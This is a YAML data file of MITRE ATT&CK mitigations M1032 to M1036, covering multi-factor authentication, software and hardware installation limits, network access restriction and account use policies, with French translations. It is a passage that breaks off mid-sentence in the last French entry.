  - urn: urn:intuitem:risk:function:mitre-attack:m1032
    ref_id: M1032
    name: Multi-factor Authentication
    category: technical
    csf_function: protect
    description: 'Multi-Factor Authentication (MFA) enhances security by requiring
      users to provide at least two forms of verification to prove their identity
      before granting access. These factors typically include:


      - *Something you know*: Passwords, PINs.

      - *Something you have*: Physical tokens, smartphone authenticator apps.

      - *Something you are*: Biometric data such as fingerprints, facial recognition,
      or retinal scans.


      Implementing MFA across all critical systems and services ensures robust protection
      against account takeover and unauthorized access. This mitigation can be implemented
      through the following measures:


      Identity and Access Management (IAM):


      - Use IAM solutions like Azure Active Directory, Okta, or AWS IAM to enforce
      MFA policies for all user logins, especially for privileged roles.

      - Enable conditional access policies to enforce MFA for risky sign-ins (e.g.,
      unfamiliar devices, geolocations).

      - Enable Conditional Access policies to only allow logins from trusted devices,
      such as those enrolled in Intune or joined via Hybrid/Entra.


      Authentication Tools and Methods:


      - Use authenticator applications such as Google Authenticator, Microsoft Authenticator,
      or Authy for time-based one-time passwords (TOTP).

      - Deploy hardware-based tokens like YubiKey, RSA SecurID, or smart cards for
      additional security.

      - Enforce biometric authentication for compatible devices and applications.


      Secure Legacy Systems:


      - Integrate MFA solutions with older systems using third-party tools like Duo
      Security or Thales SafeNet.

      - Enable RADIUS/NPS servers to facilitate MFA for VPNs, RDP, and other network
      logins.


      Monitoring and Alerting:


      - Use SIEM tools to monitor failed MFA attempts, login anomalies, or brute-force
      attempts against MFA systems.

      - Implement alerts for suspicious MFA activities, such as repeated failed codes
      or new device registrations.


      Training and Policy Enforcement:


      - Educate employees on the importance of MFA and secure authenticator usage.

      - Enforce policies that require MFA on all critical systems, especially for
      remote access, privileged accounts, and cloud applications.

      https://attack.mitre.org/mitigations/M1032'
    translations:
      fr:
        name: Authentification multifactorielle
        description: "L\u2019authentification multi-facteurs (MFA) renforce la s\xE9\
          curit\xE9 en exigeant que les utilisateurs fournissent au moins deux formes\
          \ de v\xE9rification pour prouver leur identit\xE9 avant d\u2019accorder\
          \ l\u2019acc\xE8s. Ces facteurs incluent g\xE9n\xE9ralement :\n\n- *Quelque\
          \ chose que tu sais* : mots de passe, codes PIN.\n- *Quelque chose que vous\
          \ avez* : Jetons physiques, applications d\u2019authentification pour smartphone.\n\
          - *Quelque chose que vous \xEAtes* : donn\xE9es biom\xE9triques telles que\
          \ les empreintes digitales, la reconnaissance faciale ou les scans r\xE9\
          tiniens.\n\nLa mise en \u0153uvre de la MFA sur tous les syst\xE8mes et\
          \ services critiques garantit une protection robuste contre la prise de\
          \ contr\xF4le de comptes et les acc\xE8s non autoris\xE9s. Cette att\xE9\
          nuation peut \xEAtre mise en \u0153uvre par les mesures suivantes :\n\n\
          Gestion de l\u2019identit\xE9 et des acc\xE8s (IAM) :\n\n- Utiliser des\
          \ solutions IAM comme Azure Active Directory, Okta ou AWS IAM pour appliquer\
          \ les politiques MFA \xE0 toutes les connexions utilisateur, en particulier\
          \ pour les r\xF4les privil\xE9gi\xE9s.\n- Activer des politiques d\u2019\
          acc\xE8s conditionnel pour imposer la MFA lors des connexions risqu\xE9\
          es (par exemple, appareils inconnus, g\xE9olocalisations).\n- Activer les\
          \ politiques d\u2019acc\xE8s conditionnel pour n\u2019autoriser les connexions\
          \ que depuis des appareils de confiance, tels que ceux inscrits dans Intune\
          \ ou rejoints via Hybrid/Entra.\n\nOutils et m\xE9thodes d\u2019authentification\
          \ :\n\n- Utiliser des applications d\u2019authentification telles que Google\
          \ Authenticator, Microsoft Authenticator ou Authy pour les mots de passe\
          \ \xE0 usage unique bas\xE9s sur le temps (TOTP).\n- D\xE9ploiement de jetons\
          \ mat\xE9riels comme YubiKey, RSA SecurID ou des cartes \xE0 puce pour une\
          \ s\xE9curit\xE9 accrue.\n- Imposer l\u2019authentification biom\xE9trique\
          \ pour les appareils et applications compatibles.\n\nSyst\xE8mes h\xE9rit\xE9\
          s s\xE9curis\xE9s :\n\n- Int\xE9grer des solutions MFA avec des syst\xE8\
          mes plus anciens en utilisant des outils tiers comme Duo Security ou Thales\
          \ SafeNet.\n- Activer les serveurs RADIUS/NPS pour faciliter la MFA pour\
          \ les VPN, RDP et autres connexions r\xE9seau.\n\nSurveillance et alertes\
          \ :\n\n- Utiliser les outils SIEM pour surveiller les tentatives MFA rat\xE9\
          es, les anomalies de connexion ou les tentatives de force brute contre les\
          \ syst\xE8mes MFA.\n- Mettre en \u0153uvre des alertes pour des activit\xE9\
          s MFA suspectes, telles que des codes d\xE9faillants r\xE9p\xE9t\xE9s ou\
          \ des enregistrements de nouveaux appareils.\n\nFormation et application\
          \ des politiques :\n\n- Former les employ\xE9s \xE0 l\u2019importance de\
          \ la MFA et \xE0 l\u2019utilisation s\xE9curis\xE9e des authentificateurs.\n\
          - Appliquer des politiques qui exigent la MFA sur tous les syst\xE8mes critiques,\
          \ en particulier pour l\u2019acc\xE8s \xE0 distance, les comptes privil\xE9\
          gi\xE9s et les applications cloud.\nhttps://attack.mitre.org/mitigations/M1032"
  - urn: urn:intuitem:risk:function:mitre-attack:m1033
    ref_id: M1033
    name: Limit Software Installation
    category: technical
    csf_function: protect
    description: 'Prevent users or groups from installing unauthorized or unapproved
      software to reduce the risk of introducing malicious or vulnerable applications.
      This can be achieved through allowlists, software restriction policies, endpoint
      management tools, and least privilege access principles. This mitigation can
      be implemented through the following measures:


      Application Whitelisting


      - Implement Microsoft AppLocker or Windows Defender Application Control (WDAC)
      to create and enforce allowlists for approved software.

      - Whitelist applications based on file hash, path, or digital signatures.


      Restrict User Permissions


      - Remove local administrator rights for all non-IT users.

      - Use Role-Based Access Control (RBAC) to restrict installation permissions
      to privileged accounts only.


      Software Restriction Policies (SRP)


      - Use GPO to configure SRP to deny execution of binaries from directories such
      as `%AppData%`, `%Temp%`, and external drives.

      - Restrict specific file types (`.exe`, `.bat`, `.msi`, `.js`, `.vbs`) to trusted
      directories only.


      Endpoint Management Solutions


      - Deploy tools like Microsoft Intune, SCCM, or Jamf for centralized software
      management.

      - Maintain a list of approved software, versions, and updates across the enterprise.


      Monitor Software Installation Events


      - Enable logging of software installation events and monitor Windows Event ID
      4688 and Event ID 11707 for software installs.

      - Use SIEM or EDR tools to alert on attempts to install unapproved software.


      Implement Software Inventory Management


      - Use tools like OSQuery or Wazuh to scan for unauthorized software on endpoints
      and servers.

      - Conduct regular audits to detect and remove unapproved software.


      *Tools for Implementation*


      Application Whitelisting:


      - Microsoft AppLocker

      - Windows Defender Application Control (WDAC)


      Endpoint Management:


      - Microsoft Intune

      - SCCM (System Center Configuration Manager)

      - Jamf Pro (macOS)

      - Puppet or Ansible for automation


      Software Restriction Policies:


      - Group Policy Object (GPO)

      - Microsoft Software Restriction Policies (SRP)


      Monitoring and Logging:


      - Splunk

      - OSQuery

      - Wazuh (open-source SIEM and XDR)

      - EDRs


      Inventory Management and Auditing:


      - OSQuery

      - Wazuh

      https://attack.mitre.org/mitigations/M1033'
    translations:
      fr:
        name: Installation de logiciels Limit
        description: "Emp\xEAcher les utilisateurs ou groupes d\u2019installer des\
          \ logiciels non autoris\xE9s ou non approuv\xE9s afin de r\xE9duire le risque\
          \ d\u2019introduction d\u2019applications malveillantes ou vuln\xE9rables.\
          \ Cela peut \xEAtre r\xE9alis\xE9 via des listes d\u2019acceptation, des\
          \ politiques de restriction logicielle, des outils de gestion des points\
          \ de terminaison et des principes d\u2019acc\xE8s \xE0 privil\xE8ges minimes.\
          \ Cette att\xE9nuation peut \xEAtre mise en \u0153uvre par les mesures suivantes\
          \ :\n\nListe blanche des candidatures\n\n- Impl\xE9menter Microsoft AppLocker\
          \ ou Windows Defender Application Control (WDAC) pour cr\xE9er et faire\
          \ respecter des listes de permis pour les logiciels approuv\xE9s.\n- Liste\
          \ blanche des applications en fonction du hachage du fichier, du chemin\
          \ ou des signatures num\xE9riques.\n\nRestreindre les permissions utilisateur\n\
          \n- Supprimer les droits d\u2019administrateur local pour tous les utilisateurs\
          \ non informatiques.\n- Utiliser le Contr\xF4le d\u2019Acc\xE8s Bas\xE9\
          \ sur les R\xF4les (RBAC) pour restreindre les autorisations d\u2019installation\
          \ uniquement aux comptes privil\xE9gi\xE9s.\n\nPolitiques de restriction\
          \ logicielle (SRP)\n\n- Utiliser GPO pour configurer SRP afin de refuser\
          \ l\u2019ex\xE9cution de binaires depuis des r\xE9pertoires tels que '\_\
          %AppData'', '\_%Temp\_%' et des disques durs externes.\n- Restreindre certains\
          \ types de fichiers (\xAB .exe \xBB, \xAB .bat \xBB, \xAB .msi \xBB, \xAB\
          \ .js \xBB, \xAB .vbs \xBB) uniquement aux r\xE9pertoires de confiance.\n\
          \nSolutions de gestion des terminaux\n\n- D\xE9ployer des outils comme Microsoft\
          \ Intune, SCCM ou Jamf pour une gestion centralis\xE9e des logiciels.\n\
          - Maintenir une liste des logiciels approuv\xE9s, des versions et des mises\
          \ \xE0 jour \xE0 travers l\u2019entreprise.\n\nSurveiller les \xE9v\xE9\
          nements d\u2019installation logicielle\n\n- Activer la journalisation des\
          \ \xE9v\xE9nements d\u2019installation logicielle et surveiller l\u2019\
          ID d\u2019\xE9v\xE9nement Windows 4688 et l\u2019ID d\u2019\xE9v\xE9nement\
          \ 11707 pour les installations logicielles.\n- Utiliser des outils SIEM\
          \ ou EDR pour alerter lors de tentatives d\u2019installation de logiciels\
          \ non approuv\xE9s.\n\nImpl\xE9menter la gestion des inventaires logiciels\n\
          \n- Utiliser des outils comme OSQuery ou Wazuh pour scanner les logiciels\
          \ non autoris\xE9s sur les points de terminaison et les serveurs.\n- Effectuer\
          \ des audits r\xE9guliers pour d\xE9tecter et supprimer les logiciels non\
          \ approuv\xE9s.\n\n*Outils pour la mise en \u0153uvre*\n\nListe blanche\
          \ des candidatures :\n\n- Microsoft AppLocker\n- Contr\xF4le d\u2019application\
          \ Windows Defender (WDAC)\n\nGestion des terminaux :\n\n- Microsoft Intune\n\
          - SCCM (Gestionnaire de configuration du centre syst\xE8me)\n- Jamf Pro\
          \ (macOS)\n- Puppet ou Ansible pour l\u2019automatisation\n\nPolitiques\
          \ de restriction logicielle :\n\n- Objet de Politique de Groupe (GPO)\n\
          - Politiques de restriction logicielle Microsoft (SRP)\n\nSurveillance et\
          \ enregistrement :\n\n- Splunk\n- OSQuery\n- Wazuh (SIEM et XDR open source)\n\
          - EDR\n\nGestion des stocks et audit :\n\n- OSQuery\n- Wazuh\nhttps://attack.mitre.org/mitigations/M1033"
  - urn: urn:intuitem:risk:function:mitre-attack:m1034
    ref_id: M1034
    name: Limit Hardware Installation
    category: technical
    csf_function: protect
    description: "Prevent unauthorized users or groups from installing or using hardware,\
      \ such as external drives, peripheral devices, or unapproved internal hardware\
      \ components, by enforcing hardware usage policies and technical controls. This\
      \ includes disabling USB ports, restricting driver installation, and implementing\
      \ endpoint security tools to monitor and block unapproved devices. This mitigation\
      \ can be implemented through the following measures:\n\nDisable USB Ports and\
      \ Hardware Installation Policies:\n\n- Use Group Policy Objects (GPO) to disable\
      \ USB mass storage devices:\n     - Navigate to Computer Configuration > Administrative\
      \ Templates > System > Removable Storage Access.\n     - Deny write and read\
      \ access to USB devices.\n- Whitelist approved devices using unique serial numbers\
      \ via Windows Device Installation Policies.\n\nDeploy Endpoint Protection and\
      \ Device Control Solutions:\n\n- Use tools like Microsoft Defender for Endpoint,\
      \ Symantec Endpoint Protection, or Tanium to monitor and block unauthorized\
      \ hardware.\n- Implement device control policies to allow specific hardware\
      \ types (e.g., keyboards, mice) and block others.\n\nHarden BIOS/UEFI and System\
      \ Firmware:\n\n- Set strong passwords for BIOS/UEFI access.\n- Enable Secure\
      \ Boot to prevent rogue hardware components from loading unauthorized firmware.\n\
      \nRestrict Peripheral Devices and Drivers:\n\n- Use Windows Device Manager Policies\
      \ to block installation of unapproved drivers.\n- Monitor hardware installation\
      \ attempts through endpoint monitoring tools.\n\nDisable Bluetooth and Wireless\
      \ Hardware:\n\n- Use GPO or MDM tools to disable Bluetooth and Wi-Fi interfaces\
      \ across systems.\n- Restrict hardware pairing to approved devices only.\n\n\
      Logging and Monitoring:\n\n- Enable logging for hardware installation events\
      \ in Windows Event Logs (Event ID 20001 for Device Setup Manager).\n- Use SIEM\
      \ solutions (e.g., Splunk, Elastic Stack) to detect unauthorized hardware installation\
      \ activities.\n\n*Tools for Implementation*\n\nUSB and Device Control:\n\n-\
      \ Microsoft Group Policy Objects (GPO)\n- Microsoft Defender for Endpoint\n\
      - Symantec Endpoint Protection\n- McAfee Device Control\n\nEndpoint Monitoring:\n\
      \n- EDRs\n- OSSEC (open-source host-based IDS)\n\nHardware Whitelisting:\n\n\
      - BitLocker for external drives (Windows)\n- Windows Device Installation Policies\n\
      - Device Control \n\nBIOS/UEFI Security:\n\n- Secure Boot (Windows/Linux)\n\
      Firmware management tools like Dell Command Update or HP Sure Start\nhttps://attack.mitre.org/mitigations/M1034"
    translations:
      fr:
        name: "Installation mat\xE9rielle de Limit"
        description: "Emp\xEAcher les utilisateurs ou groupes non autoris\xE9s d\u2019\
          installer ou d\u2019utiliser du mat\xE9riel, tel que des disques externes,\
          \ des p\xE9riph\xE9riques ou des composants internes non approuv\xE9s, en\
          \ appliquant des politiques d\u2019utilisation mat\xE9rielle et des contr\xF4\
          les techniques. Cela inclut la d\xE9sactivation des ports USB, la restriction\
          \ de l\u2019installation de pilotes et la mise en place d\u2019outils de\
          \ s\xE9curit\xE9 pour surveiller et bloquer les appareils non approuv\xE9\
          s. Cette att\xE9nuation peut \xEAtre mise en \u0153uvre par les mesures\
          \ suivantes :\n\nD\xE9sactivez les ports USB et les politiques d\u2019installation\
          \ mat\xE9rielle :\n\n- Utiliser des objets de politique de groupe (GPO)\
          \ pour d\xE9sactiver les p\xE9riph\xE9riques de stockage de masse USB :\n\
          \     - Naviguer vers la configuration informatique > les mod\xE8les administratifs\
          \ > syst\xE8me > acc\xE8s au stockage amovible.\n     - Refuser l\u2019\
          acc\xE8s en \xE9criture et lecture aux p\xE9riph\xE9riques USB.\n- Mettre\
          \ sur liste blanche les appareils approuv\xE9s utilisant des num\xE9ros\
          \ de s\xE9rie uniques via les politiques d\u2019installation des appareils\
          \ Windows.\n\nD\xE9ploiez des solutions de protection des terminaux et de\
          \ contr\xF4le des dispositifs :\n\n- Utiliser des outils comme Microsoft\
          \ Defender for Endpoint, Symantec Endpoint Protection ou Tanium pour surveiller\
          \ et bloquer le mat\xE9riel non autoris\xE9.\n- Impl\xE9menter des politiques\
          \ de contr\xF4le des dispositifs permettant certains types de mat\xE9riel\
          \ (par exemple, claviers, souris) et en bloquer d\u2019autres.\n\nRenforcez\
          \ le BIOS/UEFI et le firmware syst\xE8me :\n\n- D\xE9finir des mots de passe\
          \ forts pour l\u2019acc\xE8s au BIOS/UEFI.\n- Activer le Secure Boot pour\
          \ emp\xEAcher des composants mat\xE9riels malveillants de charger un firmware\
          \ non autoris\xE9.\n\nRestreignez les p\xE9riph\xE9riques et les pilotes\
          \ :\n\n- Utiliser les politiques du gestionnaire de p\xE9riph\xE9riques\
          \ Windows pour bloquer l\u2019installation de pilotes non approuv\xE9s.\n\
          - Surveiller les tentatives d\u2019installation mat\xE9rielle via des outils\
          \ de surveillance des points de terminaison.\n\nD\xE9sactivez le mat\xE9\
          riel Bluetooth et sans fil :\n\n- Utiliser des outils GPO ou MDM pour d\xE9\
          sactiver les interfaces Bluetooth et Wi-Fi entre syst\xE8mes.\n- Restreindre\
          \ l\u2019appariement mat\xE9riel uniquement aux appareils approuv\xE9s.\n\
          \nJournalisation et suivi :\n\n- Activer la journalisation des \xE9v\xE9\
          nements d\u2019installation mat\xE9rielle dans les journaux d\u2019\xE9\
          v\xE9nements Windows (ID d\u2019\xE9v\xE9nement 20001 pour le Gestionnaire\
          \ de configuration des p\xE9riph\xE9riques).\n- Utiliser des solutions SIEM\
          \ (par exemple, Splunk, Elastic Stack) pour d\xE9tecter les activit\xE9\
          s d\u2019installation mat\xE9rielle non autoris\xE9es.\n\n*Outils pour la\
          \ mise en \u0153uvre*\n\nUSB et contr\xF4le des appareils :\n\n- Objets\
          \ de politique de groupe Microsoft (GPO)\n- Microsoft Defender pour Endpoint\n\
          - Protection des terminaux Symantec\n- Contr\xF4le des dispositifs McAfee\n\
          \nSurveillance des points de terminaison :\n\n- EDR\n- OSSEC (IDS open source\
          \ bas\xE9 sur l\u2019h\xF4te)\n\nListe blanche du mat\xE9riel :\n\n- BitLocker\
          \ pour disques externes (Windows)\n- Politiques d\u2019installation des\
          \ p\xE9riph\xE9riques Windows\n- Contr\xF4le des dispositifs \n\nS\xE9curit\xE9\
          \ BIOS/UEFI :\n\n- D\xE9marrage s\xE9curis\xE9 (Windows/Linux)\nOutils de\
          \ gestion de firmware comme Dell Command Update ou HP Sure Start\nhttps://attack.mitre.org/mitigations/M1034"
  - urn: urn:intuitem:risk:function:mitre-attack:m1035
    ref_id: M1035
    name: Limit Access to Resource Over Network
    category: technical
    csf_function: protect
    description: 'Restrict access to network resources, such as file shares, remote
      systems, and services, to only those users, accounts, or systems with a legitimate
      business requirement. This can include employing technologies like network concentrators,
      RDP gateways, and zero-trust network access (ZTNA) models, alongside hardening
      services and protocols. This mitigation can be implemented through the following
      measures:


      Audit and Restrict Access:


      - Regularly audit permissions for file shares, network services, and remote
      access tools.

      - Remove unnecessary access and enforce least privilege principles for users
      and services.

      - Use Active Directory and IAM tools to restrict access based on roles and attributes.


      Deploy Secure Remote Access Solutions:


      - Use RDP gateways, VPN concentrators, and ZTNA solutions to aggregate and secure
      remote access connections.

      - Configure access controls to restrict connections based on time, device, and
      user identity.

      - Enforce MFA for all remote access mechanisms.


      Disable Unnecessary Services:


      - Identify running services using tools like netstat (Windows/Linux) or Nmap.

      - Disable unused services, such as Telnet, FTP, and legacy SMB, to reduce the
      attack surface.

      - Use firewall rules to block traffic on unused ports and protocols.


      Network Segmentation and Isolation:


      - Use VLANs, firewalls, or micro-segmentation to isolate critical network resources
      from general access.

      - Restrict communication between subnets to prevent lateral movement.


      Monitor and Log Access:


      - Monitor access attempts to file shares, RDP, and remote network resources
      using SIEM tools.

      - Enable auditing and logging for successful and failed attempts to access restricted
      resources.


      *Tools for Implementation*


      File Share Management:


      - Microsoft Active Directory Group Policies

      - Samba (Linux/Unix file share management)

      - AccessEnum (Windows access auditing tool)


      Secure Remote Access:


      - Microsoft Remote Desktop Gateway

      - Apache Guacamole (open-source RDP/VNC gateway)

      - Zero Trust solutions: Tailscale, Cloudflare Zero Trust


      Service and Protocol Hardening:


      - Nmap or Nessus for network service discovery

      - Windows Group Policy Editor for disabling SMBv1, Telnet, and legacy protocols

      - iptables or firewalld (Linux) for blocking unnecessary traffic


      Network Segmentation:


      - pfSense for open-source network isolation

      https://attack.mitre.org/mitigations/M1035'
    translations:
      fr:
        name: "Limiter l\u2019acc\xE8s aux ressources sur le r\xE9seau"
        description: "Restreignez l\u2019acc\xE8s aux ressources r\xE9seau, telles\
          \ que les partages de fichiers, les syst\xE8mes distants et les services,\
          \ uniquement aux utilisateurs, comptes ou syst\xE8mes ayant une exigence\
          \ commerciale l\xE9gitime. Cela peut inclure l\u2019utilisation de technologies\
          \ telles que les concentrateurs r\xE9seau, les passerelles RDP et les mod\xE8\
          les d\u2019acc\xE8s r\xE9seau z\xE9ro confiance (ZTNA), ainsi que le renforcement\
          \ des services et protocoles. Cette att\xE9nuation peut \xEAtre mise en\
          \ \u0153uvre par les mesures suivantes :\n\nAuditer et restreindre l\u2019\
          acc\xE8s :\n\n- Auditer r\xE9guli\xE8rement les autorisations pour les partages\
          \ de fichiers, les services r\xE9seau et les outils d\u2019acc\xE8s \xE0\
          \ distance.\n- Supprimer l\u2019acc\xE8s inutile et faire respecter les\
          \ principes de privil\xE8ge minimum pour les utilisateurs et les services.\n\
          - Utiliser les outils Active Directory et IAM pour restreindre l\u2019acc\xE8\
          s en fonction des r\xF4les et attributs.\n\nD\xE9ployez des solutions d\u2019\
          acc\xE8s \xE0 distance s\xE9curis\xE9es :\n\n- Utiliser des passerelles\
          \ RDP, des concentrateurs VPN et des solutions ZTNA pour agr\xE9ger et s\xE9\
          curiser les connexions d\u2019acc\xE8s \xE0 distance.\n- Configurer les\
          \ contr\xF4les d\u2019acc\xE8s pour restreindre les connexions en fonction\
          \ du temps, de l\u2019appareil et de l\u2019identit\xE9 de l\u2019utilisateur.\n\
          - Appliquer la MFA pour tous les m\xE9canismes d\u2019acc\xE8s \xE0 distance.\n\
          \nD\xE9sactivez les services inutiles :\n\n- Identifier les services en\
          \ cours d\u2019ex\xE9cution \xE0 l\u2019aide d\u2019outils tels que netstat\
          \ (Windows/Linux) ou Nmap.\n- D\xE9sactiver les services inutilis\xE9s,\
          \ tels que Telnet, FTP et SMB h\xE9rit\xE9, afin de r\xE9duire la surface\
          \ d\u2019attaque.\n- Utiliser les r\xE8gles de pare-feu pour bloquer le\
          \ trafic sur les ports et protocoles inutilis\xE9s.\n\nSegmentation et isolement\
          \ du r\xE9seau :\n\n- Utiliser des VLAN, des pare-feux ou une micro-segmentation\
          \ pour isoler les ressources r\xE9seau critiques de l\u2019acc\xE8s g\xE9\
          n\xE9ral.\n- Restreindre la communication entre sous-r\xE9seaux pour emp\xEA\
          cher les mouvements lat\xE9raux.\n\nSurveiller et enregistrer l\u2019acc\xE8\
          s :\n\n- Surveiller les tentatives d\u2019acc\xE8s aux partages de fichiers,\
          \ RDP et ressources r\xE9seau distantes \xE0 l\u2019aide d\u2019outils SIEM.\n\
          - Permettre l\u2019audit et la journalisation pour les tentatives r\xE9\
          ussies et infructueuses d\u2019acc\xE9der \xE0 des ressources restreintes.\n\
          \n*Outils pour la mise en \u0153uvre*\n\nGestion du partage de fichiers\
          \ :\n\n- Politiques de groupe Microsoft Active Directory\n- Samba (gestion\
          \ de partages de fichiers Linux/Unix)\n- AccessEnum (outil d\u2019audit\
          \ d\u2019acc\xE8s Windows)\n\nAcc\xE8s \xE0 distance s\xE9curis\xE9 :\n\n\
          - Passerelle de bureau \xE0 distance Microsoft\n- Apache Guacamole (passerelle\
          \ RDP/VNC open source)\n- Solutions Zero Trust : Tailscale, Cloudflare Zero\
          \ Trust\n\nRenforcement du service et du protocole :\n\n- Nmap ou Nessus\
          \ pour la d\xE9couverte des services r\xE9seau\n- \xC9diteur de Strat\xE9\
          gie de Groupe Windows pour d\xE9sactiver SMBv1, Telnet et protocoles h\xE9\
          rit\xE9s\n- iptables ou prot\xE9g\xE9s par pare-feu (Linux) pour bloquer\
          \ le trafic inutile\n\nSegmentation du r\xE9seau :\n\n- pfSense pour l\u2019\
          isolement r\xE9seau open source\nhttps://attack.mitre.org/mitigations/M1035"
  - urn: urn:intuitem:risk:function:mitre-attack:m1036
    ref_id: M1036
    name: Account Use Policies
    category: technical
    csf_function: protect
    description: 'Account Use Policies help mitigate unauthorized access by configuring
      and enforcing rules that govern how and when accounts can be used. These policies
      include enforcing account lockout mechanisms, restricting login times, and setting
      inactivity timeouts. Proper configuration of these policies reduces the risk
      of brute-force attacks, credential theft, and unauthorized access by limiting
      the opportunities for malicious actors to exploit accounts. This mitigation
      can be implemented through the following measures:


      Account Lockout Policies:


      - Implementation: Configure account lockout settings so that after a defined
      number of failed login attempts (e.g., 3-5 attempts), the account is locked
      for a specific time period (e.g., 15 minutes) or requires an administrator to
      unlock it.

      - Use Case: This prevents brute-force attacks by limiting how many incorrect
      password attempts can be made before the account is temporarily disabled, reducing
      the likelihood of an attacker successfully guessing a password.


      Login Time Restrictions:


      - Implementation: Set up login time policies to restrict when users or groups
      can log into systems. For example, only allowing login during standard business
      hours (e.g., 8 AM to 6 PM) for non-administrative accounts.

      - Use Case: This prevents unauthorized access outside of approved working hours,
      where login attempts might be more suspicious or harder to monitor. For example,
      if an account that is only supposed to be active during the day logs in at 2
      AM, it should raise an alert or be blocked.


      Inactivity Timeout and Session Termination:


      - Implementation: Enforce session timeouts after a period of inactivity (e.g.,
      10-15 minutes) and require users to re-authenticate if they wish to resume the
      session.

      - Use Case: This policy prevents attackers from hijacking active sessions left
      unattended. For example, if an employee walks away from their computer without
      locking it, an attacker with physical access to the system would be unable to
      exploit the session.


      Password Aging Policies:


      - Implementation: Enforce password aging rules, requiring users to change their
      passwords after a defined period (e.g., 90 days) and ensure passwords are not
      reused by maintaining a password history.

      - Use Case: This limits the risk of compromised passwords being used indefinitely.
      Regular password changes make it more difficult for attackers to reuse stolen
      credentials.


      Account Expiration and Deactivation:


      - Implementation: Configure user accounts, especially for temporary or contract
      workers, to automatically expire after a set date or event. Accounts that remain
      unused for a specific period should be deactivated automatically.

      - Use Case: This prevents dormant accounts from becoming an attack vector. For
      example, an attacker can exploit unused accounts if they are not properly monitored
      or deactivated.


      **Tools for Implementation**:


      - Group Policy Objects (GPOs) in Windows: To enforce account lockout thresholds,
      login time restrictions, session timeouts, and password policies.

      - Identity and Access Management (IAM) solutions: For centralized management
      of user accounts, session policies, and automated deactivation of accounts.

      - Security Information and Event Management (SIEM) platforms: To monitor and
      alert on unusual login activity, such as failed logins or out-of-hours access
      attempts.

      - Multi-Factor Authentication (MFA) Tools: To further enforce secure login attempts,
      preventing brute-force or credential stuffing attacks.

      https://attack.mitre.org/mitigations/M1036'
    translations:
      fr:
        name: "Politiques d\u2019utilisation des comptes"
        description: "Les politiques d\u2019utilisation des comptes contribuent \xE0\
          \ limiter les acc\xE8s non autoris\xE9s en configurant et en appliquant\
          \ des r\xE8gles qui r\xE9gissent les modalit\xE9s et les moments d\u2019\
          utilisation des comptes. Ces politiques comprennent la mise en \u0153uvre\
          \ de m\xE9canismes de verrouillage des comptes, la limitation des dur\xE9\
          es de connexion et la d\xE9finition de d\xE9lais d\u2019inactivit\xE9. Une\
          \ configuration ad\xE9quate de ces politiques r\xE9duit le risque d\u2019\
          attaques par force brute, de vol d\u2019identifiants et d\u2019acc\xE8s\
          \ non autoris\xE9s en limitant les possibilit\xE9s pour les acteurs malveillants\
          \ d\u2019exploiter les comptes. Cette mesure de pr\xE9vention peut \xEA\
          tre mise en \u0153uvre gr\xE2ce aux mesures suivantes :\n\nPolitiques de\
          \ verrouillage des comptes :\n\n- Mise en \u0153uvre : configurez les param\xE8\
          tres de verrouillage des comptes de sorte qu\u2019apr\xE8s un nombre d\xE9\
          fini de tentatives de connexion infructueuses (par exemple, 3 \xE0 5 tentatives),\
          \ le compte soit verrouill\xE9 pendant une dur\xE9e sp\xE9cifique (par exemple,\
          \ 15 minutes) ou ne puisse \xEAtre d\xE9verrouill\xE9 que par un administrateur.\n\
          - Cas d\u2019utilisation : cela emp\xEAche les attaques par force brute\
          \ en limitant le nombre de tentatives de mot de passe incorrectes autoris\xE9\
          es avant que le compte ne soit temporairement d\xE9sactiv\xE9, r\xE9duisant\
          \ ainsi la probabilit\xE9 qu\u2019un attaquant parvienne \xE0 deviner un\
          \ mot de passe.\n\nRestrictions relatives aux horaires de connexion :\n\n\
          - Mise en \u0153uvre : d\xE9finissez des r\xE8gles relatives aux horaires\
          \ de connexion afin de limiter les moments o\xF9 les utilisateurs ou les\
          \ groupes peuvent se connecter aux syst\xE8mes. Par exemple, n\u2019autorisez\
          \ la connexion que pendant les heures de travail normales (par exemple,\
          \ de 8 h \xE0 18 h) pour les comptes non administratifs.\n- Cas d\u2019\
          utilisation : cela emp\xEAche tout acc\xE8s non autoris\xE9 en dehors des\
          \ heures de travail approuv\xE9es, p\xE9riode durant laquelle les tentatives\
          \ de connexion peuvent s\u2019av\xE9rer plus suspectes ou plus difficiles\
          \ \xE0 surveiller. Par exemple, si un compte cens\xE9 n\u2019\xEAtre actif\
          \ que pendant la journ\xE9e se connecte \xE0 2 h du matin, cela doit d\xE9\
          clencher une alerte ou entra\xEEner son blocage.\n\nD\xE9lai d\u2019inactivit\xE9\
          \ et fin de session :\n\n- Mise en \u0153uvre : appliquez des d\xE9lais\
          \ d\u2019expiration de session apr\xE8s une p\xE9riode d\u2019inactivit\xE9\
          \ (par exemple, 10 \xE0 15 minutes) et exigez que les utilisateurs s\u2019\
          authentifient \xE0 nouveau s\u2019ils souhaitent reprendre la session.\n\
          - Cas d\u2019utilisation : cette politique emp\xEAche les attaquants de\
          \ d\xE9tourner des sessions actives laiss\xE9es sans surveillance. Par exemple,\
          \ si un employ\xE9 s\u2019\xE9loigne de son ordinateur sans le verrouiller,\
          \ un attaquant ayant un acc\xE8s physique au syst\xE8me ne serait pas en\
          \ mesure d\u2019exploiter la session.\n\nPolitiques d\u2019expiration des\
          \ mots de passe :\n\n- Mise en \u0153uvre : appliquer des r\xE8gles d\u2019\
          expiration des mots de passe, en exigeant des utilisateurs qu\u2019ils changent\
          \ leur mot de passe apr\xE8s une p\xE9riode d\xE9finie (par exemple, 90\
          \ jours) et en veillant \xE0 ce que les mots de passe ne soient pas r\xE9\
          utilis\xE9s gr\xE2ce \xE0 la conservation d\u2019un historique des mots\
          \ de passe.\n- Cas d\u2019utilisation : cela limite le risque que des mots\
          \ de passe compromis soient utilis\xE9s ind\xE9finiment. Les changements\
          \ r\xE9guliers de mot de passe compliquent la r\xE9utilisation par des attaquants\
          \ des identifiants vol\xE9s.\n\nExpiration et d\xE9sactivation des comptes\
          \ :\n\n- Mise en \u0153uvre : configurez les comptes utilisateurs, en particulier\
          \ ceux des employ\xE9s temporaires ou sous contrat, de mani\xE8re \xE0 ce\
          \ qu\u2019ils expirent automatiquement apr\xE8s une date ou un \xE9v\xE9\
          nement d\xE9fini. Les comptes qui restent inutilis\xE9s pendant une p\xE9\
          riode donn\xE9e doivent \xEAtre d\xE9sactiv\xE9s automatiquement.\n- Cas\
          \ d\u2019utilisation : cela emp\xEAche les comptes inactifs de devenir un\
          \ vecteur d\u2019attaque. Par exemple, un attaquant peut exploiter des comptes\
